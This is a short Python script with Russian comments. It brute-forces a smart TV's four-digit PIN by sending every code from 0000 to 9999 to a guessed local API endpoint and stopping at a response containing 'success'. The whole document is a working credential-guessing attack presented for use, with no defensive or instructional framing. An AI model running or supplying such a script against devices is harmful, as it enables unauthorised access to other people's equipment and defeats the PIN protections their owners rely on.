import requests

# IP-адрес телевизора
tv_ip = '192.168.1.56:80'

# URL для отправки PIN-кода (предположительно)
url = f'http://{tv_ip}/api/verify_pin'

# Список PIN-кодов для перебора (в данном примере 4-значные коды от 0000 до 9999)
pin_codes = [f'{i:04}' for i in range(10000)]

# Функция для отправки PIN-кода
def send_pin(pin):
    payload = {'pin': pin}
    response = requests.post(url, data=payload)
    return response

# Перебор PIN-кодов
for pin in pin_codes:
    response = send_pin(pin)
    if 'success' in response.text:  # Проверка успешного ответа (проверьте, что телевизор возвращает при успешном входе)
        print(f'PIN-код найден: {pin}')
        break
    else:
        print(f'PIN-код {pin} неверен')
